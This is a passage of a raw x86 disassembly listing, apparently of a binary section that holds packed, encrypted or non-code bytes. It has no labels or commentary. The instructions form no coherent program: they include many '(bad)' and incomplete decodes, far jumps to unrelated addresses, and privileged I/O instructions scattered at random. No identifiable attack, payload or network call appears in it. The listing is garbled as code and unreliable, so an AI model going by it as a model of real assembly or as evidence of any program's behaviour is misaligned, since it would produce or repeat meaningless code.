  47dce9:	stc    
  47dcea:	dec    ebp
  47dceb:	pop    es
  47dcec:	test   eax,0xb91e1eb0
  47dcf1:	or     al,0xeb
  47dcf3:	cmp    edx,DWORD PTR [ebx]
  47dcf5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47dcf6:	std    
  47dcf7:	push   0xb9305543
  47dcfc:	sub    BYTE PTR ds:0xa5a15d9,bl
  47dd02:	lods   al,BYTE PTR ds:[esi]
  47dd03:	std    
  47dd04:	test   BYTE PTR [ebp+0x40],0x3
  47dd08:	je     0x47dd19
  47dd0a:	ss pop eax
  47dd0c:	jns    0x47dcac
  47dd0e:	pop    eax
  47dd0f:	push   0x9a70c01c
  47dd14:	mov    BYTE PTR [eax-0x57],bl
  47dd17:	inc    esp
  47dd18:	or     al,0xc7
  47dd1a:	sbb    al,0x7
  47dd1c:	sub    bl,BYTE PTR [ebx-0x25677cab]
  47dd22:	mov    bh,BYTE PTR [edx+0x44]
  47dd25:	sbb    DWORD PTR [edx+0x7493d90e],edx
  47dd2b:	sub    BYTE PTR [ebx+0xf],0x6a
  47dd2f:	mov    WORD PTR [esi+edx*4],?
  47dd32:	adc    bh,BYTE PTR [edi+0x2f]
  47dd35:	test   al,0xd8
  47dd37:	dec    ecx
  47dd38:	add    al,BYTE PTR [ebx]
  47dd3a:	adc    BYTE PTR [edx-0x16],bh
  47dd3d:	in     eax,0x35
  47dd3f:	test   al,0x8e
  47dd41:	mov    ebp,0x17b59356
  47dd46:	shr    dl,0x83
  47dd49:	sub    edi,DWORD PTR [esp+ebx*2+0x3d5abeb]
  47dd50:	lods   eax,DWORD PTR ds:[esi]
  47dd51:	jle    0x47dd6f
  47dd53:	xlat   BYTE PTR ds:[ebx]
  47dd54:	mov    al,0xad
  47dd56:	mov    dh,0xb2
  47dd58:	cmp    DWORD PTR es:[edi+0x3c1acab1],0xbb4151e0
  47dd63:	fld    DWORD PTR [ecx-0x72]
  47dd66:	push   0x65
  47dd68:	or     al,0xa5
  47dd6a:	sbb    dl,BYTE PTR [eax]
  47dd6c:	inc    edx
  47dd6d:	adc    al,0xc0
  47dd6f:	mov    eax,DWORD PTR [eax]
  47dd71:	in     eax,0xaa
  47dd73:	add    eax,0xce7145d
  47dd78:	das    
  47dd79:	pop    ecx
  47dd7a:	inc    ebx
  47dd7b:	sub    al,0x8c
  47dd7d:	dec    edi
  47dd7e:	push   es
  47dd7f:	daa    
  47dd80:	sbb    ebp,DWORD PTR [ebx-0x3e]
  47dd83:	rep ins BYTE PTR es:[edi],dx
  47dd85:	aas    
  47dd86:	shr    BYTE PTR [edi-0x39d0fef8],0x47
  47dd8d:	and    DWORD PTR [ecx],eax
  47dd8f:	and    DWORD PTR [eax+0xc288592],edx
  47dd95:	mov    esi,0x85983405
  47dd9a:	adc    al,0xdf
  47dd9c:	xor    dl,ah
  47dd9e:	add    bh,BYTE PTR [esi]
  47dda0:	fwait
  47dda1:	jmp    0x2ecc7a6a
  47dda6:	mov    bh,0xc9
  47dda8:	adc    DWORD PTR [ebx],edx
  47ddaa:	out    dx,eax
  47ddab:	nop
  47ddac:	lahf   
  47ddad:	ret    0xbe68
  47ddb0:	xor    al,0x28
  47ddb2:	sbb    dh,BYTE PTR [esi]
  47ddb4:	jbe    0x47dd5a
  47ddb6:	cs jl  0x47de00
  47ddb9:	or     eax,0xc231e9d
  47ddbe:	mov    cl,0x59
  47ddc0:	pushf  
  47ddc1:	jmp    0x47ddce
  47ddc3:	dec    edx
  47ddc4:	or     ch,BYTE PTR [edx+eiz*1+0xe02e415]
  47ddcb:	nop
  47ddcc:	mov    eax,ds:0x540d28c
  47ddd1:	mov    esi,0x19e90f1a
  47ddd6:	add    al,0x4c
  47ddd8:	pop    eax
  47ddd9:	mov    WORD PTR [ecx],?
  47dddb:	imul   eax,DWORD PTR [ebp+0x3be6281],0x10d24b
  47dde5:	sbb    esp,DWORD PTR [ecx]
  47dde7:	or     al,0x70
  47dde9:	inc    ecx
  47ddea:	inc    esi
  47ddeb:	dec    edx
  47ddec:	jns    0x47dda6
  47ddee:	xlat   BYTE PTR ds:[ebx]
  47ddef:	or     eax,0x3d277d18
  47ddf4:	(bad)  [eax]
  47ddf6:	jmp    0xa753e0d1
  47ddfb:	jne    0x47de60
  47ddfd:	cmp    al,0xa8
  47ddff:	xor    eax,0x144057ac
  47de04:	mov    al,ds:0x1a72c32e
  47de09:	jecxz  0x47de32
  47de0b:	adc    BYTE PTR [ebx],cl
  47de0d:	and    BYTE PTR [ebx],0x4a
  47de10:	inc    ecx
  47de11:	ja     0x47ddf3
  47de13:	mov    bh,0xf0
  47de15:	push   cs
  47de16:	test   DWORD PTR [edx+eiz*2+0x54ee5b55],esi
  47de1d:	jge    0x47dde9
  47de1f:	sbb    eax,0x2c0640e5
  47de24:	push   esp
  47de25:	rcl    ebx,1
  47de27:	and    esp,edi
  47de29:	clc    
  47de2a:	add    ah,ah
  47de2c:	call   0x5838fb8f
  47de31:	add    cl,BYTE PTR ds:0xa4a128eb
  47de37:	add    BYTE PTR [ebx+ebp*8-0x7568d3de],ah
  47de3e:	add    al,bh
  47de40:	adc    BYTE PTR [edx],0x44
  47de43:	adc    al,dl
  47de45:	dec    esi
  47de46:	adc    ah,dh
  47de48:	test   DWORD PTR [esi+esi*8+0x58],esi
  47de4c:	pop    ebp
  47de4d:	adc    al,0x69
  47de4f:	fld    st(4)
  47de51:	xchg   edi,eax
  47de52:	add    BYTE PTR [ebp+0x2a],0xe3
  47de56:	push   0x6ea53ec5
  47de5b:	imul   esi,DWORD PTR [esi],0xffffffa7
  47de5e:	test   DWORD PTR [esp+eiz*8],0x4c0ec852
  47de65:	xchg   edx,eax
  47de66:	or     ebx,DWORD PTR [edi-0x79]
  47de69:	and    edi,DWORD PTR [edx]
  47de6b:	adc    eax,0x6f1db5fb
  47de70:	(bad)  
  47de71:	push   edi
  47de72:	icebp  
  47de73:	sbb    eax,esp
  47de75:	loopne 0x47deb2
  47de77:	add    eax,0xf645be02
  47de7c:	pop    ecx
  47de7d:	add    BYTE PTR [ebx],0x87
  47de80:	iret   
  47de81:	push   ebp
  47de82:	imul   BYTE PTR [ebp+0x6c]
  47de85:	or     eax,0x8b536c2d
  47de8a:	adc    ebx,DWORD PTR [edi+0x8]
  47de8d:	inc    edx
  47de8e:	xchg   BYTE PTR [esi-0x64],ah
  47de91:	sub    esi,ebx
  47de93:	cld    
  47de94:	sbb    esp,edi
  47de96:	sub    DWORD PTR [ebp+0x3],ebx
  47de99:	inc    eax
  47de9a:	jmp    0x8855e95b
  47de9f:	ja     0x47de79
  47dea1:	cmp    ebp,DWORD PTR [edx+0x1e]
  47dea4:	jno    0x47de8b
  47dea6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47dea7:	xchg   edx,eax
  47dea8:	daa    
  47dea9:	(bad)  
  47deaa:	pop    edx
  47deab:	sub    edx,eax
  47dead:	cdq    
  47deae:	pop    eax
  47deaf:	add    DWORD PTR [ecx-0x1f745bf1],ebx
  47deb5:	loope  0x47de70
  47deb7:	mov    ds:0x5dabc6fc,eax
  47debc:	add    BYTE PTR [edx+eax*1],dl
  47debf:	push   cs
  47dec0:	retf   0x8772
  47dec3:	push   0xffffffc3
  47dec5:	dec    ecx
  47dec6:	mov    ds:0x13bcf471,al
  47decb:	push   edx
  47decc:	add    eax,0xbb69c3cb
  47ded1:	lods   al,BYTE PTR ds:[esi]
  47ded2:	retf   0x1204
  47ded5:	jmp    DWORD PTR [ecx+ebx*4]
  47ded8:	nop
  47ded9:	pop    ss
  47deda:	outs   dx,DWORD PTR ds:[esi]
  47dedb:	or     al,0xbe
  47dedd:	aam    0x80
  47dedf:	shl    ecx,0x1e
  47dee2:	loop   0x47df54
  47dee4:	or     BYTE PTR [ebx],cl
  47dee6:	ret    0xb23d
  47dee9:	fwait
  47deea:	int3   
  47deeb:	adc    al,0x19
  47deed:	inc    ebx
  47deee:	ins    BYTE PTR es:[edi],dx
  47deef:	adc    al,0xc1
  47def1:	shl    DWORD PTR [esi],0xa
  47def4:	scas   eax,DWORD PTR es:[edi]
  47def5:	rcl    dl,cl
  47def7:	addr16 jno 0x47defa
  47defa:	mov    WORD PTR [eax],fs
  47defc:	and    eax,0x2f448fe
  47df01:	push   0xc479d851
  47df06:	fidiv  WORD PTR [eax]
  47df08:	ret    
  47df09:	mov    eax,ds:0x3090f3a8
  47df0e:	mov    eax,ds:0x37f72c81
  47df13:	or     eax,0x2c5c80a8
  47df18:	push   es
  47df19:	xchg   edx,eax
  47df1a:	sub    bl,BYTE PTR [eax+0x240dc517]
  47df20:	or     BYTE PTR [esi+ebx*4],cl
  47df23:	jecxz  0x47deb8
  47df25:	(bad)  
  47df26:	adc    esp,DWORD PTR [edi+0xd6fe4a1]
  47df2c:	mov    al,0x5
  47df2e:	fsubr  DWORD PTR [ebx+0x3f]
  47df31:	daa    
  47df32:	push   ebx
  47df33:	stos   BYTE PTR es:[edi],al
  47df34:	in     al,dx
  47df35:	push   esi
  47df36:	sub    cl,BYTE PTR [ecx]
  47df38:	push   ss
  47df39:	pop    edx
  47df3a:	push   ebx
  47df3b:	mov    ds:0xdbd9ac91,eax
  47df40:	(bad)  
  47df41:	sub    eax,0x6ce4925c
  47df46:	dec    ebx
  47df47:	add    DWORD PTR [edx-0x35],ebx
  47df4a:	add    BYTE PTR [eax-0x1d],bl
  47df4d:	pop    ss
  47df4e:	call   0xd910830f
  47df53:	fcomp  DWORD PTR [esi]
  47df55:	es daa 
  47df57:	enter  0x1b3,0x7b
  47df5b:	les    edi,FWORD PTR [eax+0x27e77ba5]
  47df61:	mov    eax,ds:0xff5b57a0
  47df66:	jl     0x47def7
  47df68:	mov    ss,WORD PTR [ebp+edx*1-0x80]
  47df6c:	add    al,0x8a
  47df6e:	pop    esp
  47df6f:	and    al,0x34
  47df71:	push   edx
  47df72:	pop    es
  47df73:	push   es
  47df74:	mov    al,0x7b
  47df76:	(bad)  
  47df77:	cmp    BYTE PTR [ebp+0x1f73dc84],ah
  47df7d:	push   0x48
  47df7f:	mov    eax,ds:0x1df0dd
  47df84:	cmp    BYTE PTR [ecx-0xb635cb9],ah
  47df8a:	cwde   
  47df8b:	cmp    al,0x68
  47df8d:	aad    0x24
  47df8f:	or     al,BYTE PTR [eax+0xfce37b1]
  47df95:	fcom   st(3)
  47df97:	stos   BYTE PTR es:[edi],al
  47df98:	clc    
  47df99:	sbb    esp,ecx
  47df9b:	sub    al,0x80
  47df9d:	jne    0x47dfc9
  47df9f:	mov    esi,0xbf3a2080
  47dfa4:	and    bh,al
  47dfa6:	(bad)  
  47dfa7:	aam    0xe0
  47dfa9:	je     0x47e022
  47dfab:	or     edi,edi
  47dfad:	inc    edi
  47dfae:	aam    0x3d
  47dfb0:	mov    BYTE PTR ds:0x82bf0aa2,bl
  47dfb6:	ins    BYTE PTR es:[edi],dx
  47dfb7:	xor    BYTE PTR [edx+0x20],0x82
  47dfbb:	outs   dx,DWORD PTR ds:[esi]
  47dfbc:	or     DWORD PTR [ebx],0xffffffb4
  47dfbf:	jnp    0x47df82
  47dfc1:	push   ebx
  47dfc2:	sbb    DWORD PTR [edx+0x62],0xffffff83
  47dfc6:	dec    esi
  47dfc7:	fdivr  QWORD PTR [edx+0x1]
  47dfca:	aas    
  47dfcb:	jbe    0x47dfa2
  47dfcd:	sub    eax,0x215720a0
  47dfd2:	dec    esi
  47dfd3:	adc    BYTE PTR [ebx-0x3347fbfa],0x32
  47dfda:	or     bl,BYTE PTR [eax-0x6d]
  47dfdd:	or     BYTE PTR [ebp+0x51],dh
  47dfe0:	shr    BYTE PTR [eax+0x7c05df32],0x15
  47dfe7:	mov    bh,BYTE PTR [edi]
  47dfe9:	sub    eax,0xc0511813
  47dfee:	and    eax,0xd7564d18
  47dff3:	and    al,0xe0
  47dff5:	mov    ds:0x219574f,al
  47dffa:	or     bl,BYTE PTR [eax-0x4e]
  47dffd:	rcl    DWORD PTR [ecx],1
  47dfff:	dec    esp
  47e000:	lahf   
  47e001:	or     DWORD PTR [edx],esp
  47e003:	sub    cl,al
  47e005:	or     al,0x30
  47e007:	xor    eax,0xe028f710
  47e00c:	scas   al,BYTE PTR es:[edi]
  47e00d:	cwde   
  47e00e:	jmp    0xcbb0:0x2ae2420e
  47e015:	xchg   esi,eax
  47e016:	adc    BYTE PTR [edx+0x7b371a47],dh
  47e01c:	adc    al,0x9
  47e01e:	and    al,0x7d
  47e020:	pop    es
  47e021:	popa   
  47e022:	mov    ah,0x1f
  47e024:	add    cl,BYTE PTR [ebp+0x2]
  47e027:	adc    bl,BYTE PTR [eax]
  47e029:	mov    DWORD PTR [edi+0x20],eax
  47e02c:	pop    edi
  47e02d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47e02e:	test   DWORD PTR [edx],eax
  47e030:	sbb    al,0xa1
  47e032:	cmc    
  47e033:	or     DWORD PTR [ebp+0x70],ebx
  47e036:	ret    
  47e037:	addr16 adc dh,ch
  47e03a:	addps  xmm1,XMMWORD PTR [edx]
  47e03d:	inc    ebx
  47e03e:	xchg   ebx,eax
  47e03f:	cmp    DWORD PTR [ebx],edx
  47e041:	lock xchg edi,eax
  47e043:	mov    dl,0x12
  47e045:	adc    BYTE PTR [eax+ebp*2],ch
  47e048:	inc    eax
  47e049:	and    al,0xbd
  47e04b:	jmp    0x47dfdd
  47e04d:	push   es
  47e04e:	mov    bh,0xf2
  47e050:	pushf  
  47e051:	fdiv   QWORD PTR [ecx-0x5]
  47e054:	mov    edx,0x76121ec0
  47e059:	or     ebp,eax
  47e05b:	sbb    DWORD PTR [esi],edx
  47e05d:	jp     0x47e06b
  47e05f:	fdiv   QWORD PTR [esi+ecx*1]
  47e062:	lods   eax,DWORD PTR ds:[esi]
  47e063:	clc    
  47e064:	inc    edi
  47e065:	sbb    dl,al
  47e067:	sbb    eax,0x12d8ea50
  47e06c:	add    cl,BYTE PTR [esi-0x3b2a2480]
  47e072:	mov    esp,0xa938084b
  47e077:	int    0x59
  47e079:	retf   
  47e07a:	sbb    DWORD PTR [esi+0x404600c2],edi
  47e080:	mov    ds:0xff022870,eax
  47e085:	adc    DWORD PTR [ecx],eax
  47e087:	enter  0x3360,0xf6
  47e08b:	add    ah,BYTE PTR ds:0x217fa59
  47e091:	mov    ds:0xfec88348,eax
  47e096:	inc    eax
  47e097:	inc    ebx
  47e098:	sar    BYTE PTR [edi],1
  47e09a:	cmp    edi,esi
  47e09c:	sbb    eax,0xfeca834a
  47e0a1:	inc    edx
  47e0a2:	cmp    eax,edx
  47e0a4:	imul   esi,edi,0x68
  47e0a7:	ret    0x8d01
  47e0aa:	addr16 retf 
  47e0ac:	cmp    al,0x13
  47e0ae:	mov    ah,0x5f
  47e0b0:	imul   ebp,DWORD PTR [eax+0x46ca7509],0xc20afe83
  47e0ba:	pmaddwd mm0,mm4
  47e0bd:	test   DWORD PTR [edx],ebp
  47e0bf:	sub    BYTE PTR [eax],0xc7
  47e0c2:	and    ah,cl
  47e0c4:	dec    ecx
  47e0c5:	mov    DWORD PTR [ecx],ecx
  47e0c7:	pop    ds
  47e0c8:	bound  esp,QWORD PTR [eax+0x40]
  47e0cb:	sub    bl,BYTE PTR [esi]
  47e0cd:	and    al,0x9f
  47e0cf:	jb     0x47e0c5
  47e0d1:	sub    eax,DWORD PTR ds:0x2369724c
  47e0d7:	hlt    
  47e0d8:	lahf   
  47e0d9:	jp     0x47e106
  47e0db:	jns    0x47e0e9
  47e0dd:	mov    edi,0x704e2370
  47e0e2:	add    eax,0x8c8ac7dc
  47e0e7:	ins    DWORD PTR es:[edi],dx
  47e0e8:	lock add eax,0x592b181c
  47e0ee:	add    DWORD PTR [edx+0x2851b14a],0xffffff96
  47e0f5:	aas    
  47e0f6:	pop    es
  47e0f7:	(bad)  
  47e0f8:	std    
  47e0f9:	sbb    eax,0x2d5980c5
  47e0fe:	je     0x47e122
  47e100:	pusha  
  47e101:	pop    ebx
  47e102:	imul   ecx,DWORD PTR [edx],0x4d
  47e105:	mov    esp,0xe8c00fc3
  47e10a:	pop    ecx
  47e10b:	mov    ebp,0xa2c242c9
  47e110:	fs in  al,dx
  47e112:	adc    eax,ecx
  47e114:	(bad)  
  47e115:	mov    ah,0x76
  47e117:	xchg   DWORD PTR [esi],edi
  47e119:	popf   
  47e11a:	and    al,0x42
  47e11c:	test   DWORD PTR [ecx+edx*1+0x6c],0x699e6052
  47e124:	repz std 
  47e126:	add    eax,0x4ca1f619
  47e12b:	adc    ecx,DWORD PTR [bx+si-0x4e]
  47e12f:	in     al,0xd8
  47e131:	mov    eax,ds:0xc7639050
  47e136:	mov    ?,WORD PTR [ecx]
  47e138:	in     al,0x59
  47e13a:	fcom   DWORD PTR [ebx]
  47e13c:	fmul   QWORD PTR [eax]
  47e13e:	xchg   DWORD PTR [esp+eiz*8],esi
  47e141:	loopne 0x47e162
  47e143:	dec    edx
  47e144:	jmp    0x959d:0x36c908b4
  47e14b:	sub    dl,BYTE PTR [eax+0x1f]
  47e14e:	cmp    BYTE PTR [eax+0x12a06668],0xfc
  47e155:	and    BYTE PTR [ecx],ah
  47e157:	out    dx,eax
  47e158:	enter  0x412c,0xc8
  47e15c:	sub    BYTE PTR fs:[eax+ecx*2],dh
  47e160:	enter  0x69c3,0x3f
  47e164:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47e165:	and    al,0x42
  47e167:	xor    bl,bh
  47e169:	xor    dh,BYTE PTR [eax]
  47e16b:	test   BYTE PTR [esi],ah
  47e16d:	in     eax,dx
  47e16e:	clc    
  47e16f:	es xchg ebp,esi
  47e172:	loope  0x47e114
  47e174:	rcl    DWORD PTR [ebp-0x38],1
  47e177:	adc    ch,BYTE PTR [edx+0x7]
  47e17a:	test   eax,0x7373ecc
  47e17f:	push   0x56a98a3
  47e184:	pop    ss
  47e185:	pushf  
  47e186:	or     eax,0x19f8defe
  47e18b:	mov    al,ds:0xa87f0068
  47e190:	jb     0x47e1ed
  47e192:	js     0x47e137
  47e194:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47e195:	jl     0x47e210
  47e197:	hlt    
  47e198:	pop    edi
  47e199:	add    dl,BYTE PTR [eax]
  47e19b:	sbb    al,0x66
  47e19d:	mov    ecx,0x54c2002c
  47e1a2:	mov    edi,0x40a3c4af
  47e1a7:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  47e1a9:	sbb    edi,ebx
  47e1ab:	sub    BYTE PTR [eax],dl
  47e1ad:	fdivr  QWORD PTR [ebx-0x1fe621ff]
  47e1b3:	and    BYTE PTR [eax-0x5c176ace],dl
  47e1b9:	sbb    eax,0xe8840316
  47e1be:	arpl   WORD PTR [esi-0x76f11245],bx
  47e1c4:	and    DWORD PTR [ebp+0x1cc844b9],ebp
  47e1ca:	mov    edx,0x93740854
  47e1cf:	iret   
  47e1d0:	neg    DWORD PTR [edi-0x4e]
  47e1d3:	xor    DWORD PTR [ebx],ebp
  47e1d5:	inc    eax
  47e1d6:	mov    ecx,0x5c26ca4c
  47e1db:	retf   0xb3c0
  47e1de:	sub    al,0x9d
  47e1e0:	dec    eax
  47e1e1:	cli    
  47e1e2:	ret    
  47e1e3:	nop
  47e1e4:	cmp    edx,eax
  47e1e6:	jg     0x47e1ae
  47e1e8:	(bad)  
  47e1ea:	sbb    esp,esp
  47e1ec:	cdq    
  47e1ed:	or     eax,0x4225d9b7
  47e1f2:	in     al,dx
  47e1f3:	pop    eax
  47e1f4:	cdq    
  47e1f5:	nop
  47e1f6:	das    
  47e1f7:	loopne 0x47e21e
  47e1f9:	inc    edx
  47e1fa:	in     al,dx
  47e1fb:	cmp    BYTE PTR [esi],ah
  47e1fd:	push   ecx
  47e1fe:	jp     0x47e207
  47e200:	or     eax,0x143e48b7
  47e205:	and    ecx,DWORD PTR [edi+0x21]
  47e208:	push   edi
  47e209:	scas   al,BYTE PTR es:[edi]
  47e20a:	adc    al,0x1e
  47e20c:	inc    ecx
  47e20d:	add    dl,BYTE PTR [esi+0x66]
  47e210:	je     0x47e1b7
  47e212:	mov    al,0x34
  47e214:	enter  0x4227,0xb
  47e218:	aaa    
  47e219:	jae    0x47e1ec
  47e21b:	sahf   
  47e21c:	and    eax,0xaccfa044
  47e221:	repnz push ebp
  47e223:	and    eax,0x280cdf81
  47e228:	inc    edx
  47e229:	xchg   ebp,eax
  47e22a:	add    BYTE PTR [ebx-0x51],bh
  47e22d:	pop    esp
  47e22e:	push   cs
  47e22f:	cmp    al,0x6
  47e231:	or     al,0xc6
  47e233:	xchg   esp,eax
  47e234:	mov    ah,0xb
  47e236:	dec    ebx
  47e237:	out    dx,al
  47e238:	gs fs leave 
  47e23b:	(bad)  
  47e23c:	daa    
  47e23d:	iret   
  47e23e:	(bad)  
  47e23f:	xchg   edx,eax
  47e240:	inc    edi
  47e241:	dec    esi
  47e242:	adc    al,0x27
  47e244:	push   esp
  47e245:	es inc edx
  47e247:	jl     0x47e271
  47e249:	fisub  WORD PTR [eax+esi*8]
  47e24c:	nop
  47e24d:	inc    edx
  47e24e:	push   es
  47e24f:	push   esp
  47e250:	out    0xd,eax
  47e252:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47e253:	cmp    BYTE PTR [eax-0x76a9c070],ah
  47e259:	push   cs
  47e25a:	mov    esp,0x707767f8
  47e25f:	adc    eax,0x2fa54222
  47e264:	sbb    esp,DWORD PTR [ecx+0xebf96f3]
  47e26a:	adc    DWORD PTR [edx],0x3
  47e26d:	sub    ecx,DWORD PTR [ecx]
  47e26f:	and    ch,BYTE PTR [edx]
  47e271:	mov    WORD PTR [ebp+edx*1-0x7f],?
  47e275:	pop    esp
  47e276:	jne    0x47e292
  47e278:	(bad)  
  47e279:	retf   
  47e27a:	sbb    eax,eax
  47e27c:	mov    ecx,0xbc338b25
  47e281:	adc    BYTE PTR [edx+0x51ff9a9b],bh
  47e287:	xor    DWORD PTR [ebx*4+0x3731b520],eax
  47e28e:	es (bad) 
  47e291:	adc    DWORD PTR [edx-0x7624fafe],eax
  47e297:	sbb    al,0x25
  47e299:	push   edi
  47e29a:	adc    BYTE PTR [eax],cl
  47e29c:	dec    eax
  47e29d:	aam    0xf5
  47e29f:	das    
  47e2a0:	push   esi
  47e2a1:	test   DWORD PTR [esi-0x7e7d98fa],eax
  47e2a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47e2a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  47e2a9:	mov    esi,0xa416d829
  47e2ae:	cdq    
  47e2af:	xchg   edi,eax
  47e2b0:	inc    edi
  47e2b1:	aas    
  47e2b2:	sub    BYTE PTR [ecx-0x6b],0x23
  47e2b6:	ja     0x47e2c0
  47e2b8:	inc    ebx
  47e2b9:	push   eax
  47e2ba:	push   eax
  47e2bb:	sbb    ah,al
  47e2bd:	loopne 0x47e240
  47e2bf:	out    0x69,eax
  47e2c1:	push   0x4270a2f2
  47e2c6:	aas    
  47e2c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47e2c8:	lods   eax,DWORD PTR ds:[esi]
  47e2c9:	sub    BYTE PTR [esi-0xfb37f1c],al
  47e2cf:	mov    ah,0x28
  47e2d1:	lock xchg ecx,eax
  47e2d3:	push   es
  47e2d4:	sbb    DWORD PTR [eax-0x1a],ebx
  47e2d7:	xchg   edi,eax
  47e2d8:	dec    esi
  47e2d9:	dec    esi
  47e2da:	dec    esi
  47e2db:	outs   dx,BYTE PTR ds:[esi]
  47e2dc:	movaps xmm4,XMMWORD PTR [eax+eiz*1]
  47e2e0:	sbb    al,0x2c
  47e2e2:	pop    esp
  47e2e3:	dec    esi
  47e2e4:	dec    esi
  47e2e5:	sbb    BYTE PTR [edx+edx*2],dl
  47e2e8:	in     eax,dx
  47e2e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47e2ea:	sti    
  47e2eb:	enter  0xa650,0x18
  47e2ef:	in     al,0xc3
  47e2f1:	aaa    
  47e2f2:	adc    BYTE PTR [edi+ecx*1],cl
  47e2f5:	in     al,0xc9
  47e2f7:	leave  
  47e2f8:	leave  
  47e2f9:	or     BYTE PTR [eax+eax*1],al
  47e2fc:	cld    
  47e2fd:	xchg   esi,eax
  47e2fe:	in     al,0xe4
  47e300:	in     al,0x64
  47e302:	clc    
  47e303:	hlt    
  47e304:	lock in al,dx
  47e306:	in     al,0xe4
  47e308:	in     al,0xe4
  47e30a:	call   0x4d24c3f3
  47e30f:	repnz and ch,0xd8
  47e313:	imul   DWORD PTR [ecx-0x79a70bd7]
  47e319:	in     al,0x80
  47e31b:	mov    al,0x29
  47e31d:	hlt    
  47e31e:	add    DWORD PTR [ebx+0x19a75dad],ecx
  47e324:	or     BYTE PTR [edx+0x544124fb],dh
  47e32a:	xchg   edi,eax
  47e32b:	xchg   BYTE PTR [edx],ch
  47e32d:	mov    BYTE PTR [edx-0x15],dl
  47e330:	xor    ebp,0x2c9fdd7c
  47e336:	xor    al,0xcc
  47e338:	mov    DWORD PTR [ebp+edi*2+0x111c3d83],ebx
  47e33f:	je     0x47e2d9
  47e341:	adc    BYTE PTR [edx],bl
  47e343:	or     BYTE PTR [esi-0x3a],0x31
  47e347:	adc    bh,BYTE PTR [edx+0x2b9c9fdf]
  47e34d:	sub    BYTE PTR [ecx+0x158b64a0],bh
  47e353:	or     BYTE PTR [edx],bl
  47e355:	or     eax,0xc03fb984
  47e35a:	add    bl,BYTE PTR [ecx]
  47e35c:	mov    eax,0x4a3f17a3
  47e361:	or     bl,BYTE PTR [eax]
  47e363:	xor    eax,0x4ec23bbb
  47e368:	pop    edx
  47e369:	out    dx,al
  47e36a:	mov    eax,ds:0x2188d38b
  47e36f:	jbe    0x47e372
  47e371:	imul   ebp,DWORD PTR [esi],0x2f6f2aee
  47e377:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47e378:	or     edi,DWORD PTR [edx+0x5c60774]
  47e37e:	add    ebp,edi
  47e380:	mov    BYTE PTR [eax+0x357c9020],0xf5
  47e387:	adc    eax,0x422a8d87
  47e38c:	or     cl,BYTE PTR [eax]
  47e38e:	and    eax,DWORD PTR [ecx+0x13c0e3]
  47e394:	push   ss
  47e395:	push   edi
  47e396:	das    
  47e397:	iret   
  47e398:	add    bl,BYTE PTR [esi+0x41]
  47e39b:	and    BYTE PTR [ecx+0x74],ch
  47e39e:	outs   dx,DWORD PTR ds:[esi]
  47e39f:	jb     0x47e367
  47e3a1:	inc    ecx
  47e3a2:	pop    edi
  47e3a3:	or     dl,BYTE PTR [esi+0x43]
  47e3a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47e3a7:	ins    BYTE PTR es:[edi],dx
  47e3a8:	and    BYTE PTR [eax],ah
  47e3aa:	mov    ecx,0xf04bb24
  47e3af:	xchg   ebp,eax
  47e3b0:	sub    edi,eax
  47e3b2:	pop    edi
  47e3b3:	ins    DWORD PTR es:[edi],dx
  47e3b4:	pop    ss
  47e3b5:	push   ebx
  47e3b6:	(bad)  
  47e3b7:	inc    DWORD PTR [eax-0x14da81fc]
  47e3bd:	aaa    
  47e3be:	inc    eax
  47e3bf:	rol    DWORD PTR [ebx-0x157c4b3e],cl
  47e3c5:	mov    esi,0x2f84122
  47e3ca:	jb     0x47e3de
  47e3cc:	je     0x47e3e2
  47e3ce:	or     BYTE PTR [edx+0x14],0x73
  47e3d2:	adc    al,0x42
  47e3d4:	add    esi,DWORD PTR [eax+0xdeb73b1]
  47e3da:	add    BYTE PTR [ecx],cl
  47e3dc:	inc    ebp
  47e3dd:	ret    
  47e3de:	jns    0x47e423
  47e3e0:	mov    ebx,DWORD PTR ds:0xfa1e4378
  47e3e6:	out    dx,al
  47e3e7:	push   es
  47e3e8:	push   ebx
  47e3e9:	rcl    DWORD PTR [esi+0x4b],cl
  47e3ec:	push   eax
  47e3ed:	mov    BYTE PTR [edi+eax*1],bh
  47e3f0:	adc    cl,bl
  47e3f2:	xchg   ebp,eax
  47e3f3:	cmc    
  47e3f4:	sbb    dl,0x4d
  47e3f7:	adc    BYTE PTR [edx-0x4e],dh
  47e3fa:	out    dx,eax
  47e3fb:	repnz (bad) 
  47e3fd:	nop    DWORD PTR [ebp+0xc]
  47e401:	sbb    DWORD PTR [edx],esp
  47e403:	xchg   DWORD PTR [ebx],esp
  47e405:	mov    ecx,0xba0d2bb8
  47e40a:	dec    eax
  47e40b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47e40c:	add    BYTE PTR [edx],al
  47e40e:	pop    ss
  47e40f:	push   edi
  47e410:	sbb    ah,BYTE PTR [edx]
  47e412:	push   eax
  47e413:	pusha  
  47e414:	ror    DWORD PTR [edi],0x20
  47e417:	xor    eax,0xa80b4a48
  47e41c:	push   esp
  47e41d:	(bad)  
  47e41e:	pop    eax
  47e41f:	fwait
  47e420:	test   BYTE PTR [ebx+0x67],0xa8
  47e424:	je     0x47e4a4
  47e426:	and    al,0xa
  47e428:	or     al,0x1e
  47e42a:	push   0x37
  47e42c:	ins    DWORD PTR es:[edi],dx
  47e42d:	jg     0x47e3b1
  47e42f:	add    BYTE PTR [ecx+0x3b],ah
  47e432:	add    edi,DWORD PTR [esi+0x12]
  47e435:	push   0x1
  47e437:	pop    ss
  47e438:	pusha  
  47e439:	jle    0x47e440
  47e43b:	mov    esi,0x6c249960
  47e440:	mov    al,ds:0x5c551234
  47e445:	inc    ebx
  47e446:	pop    edx
  47e447:	sbb    edx,edx
  47e449:	das    
  47e44a:	sub    DWORD PTR [esi+0x345e029],edx
  47e450:	sbb    al,0x9e
  47e452:	add    al,BYTE PTR [ecx-0x78]
  47e455:	inc    edi
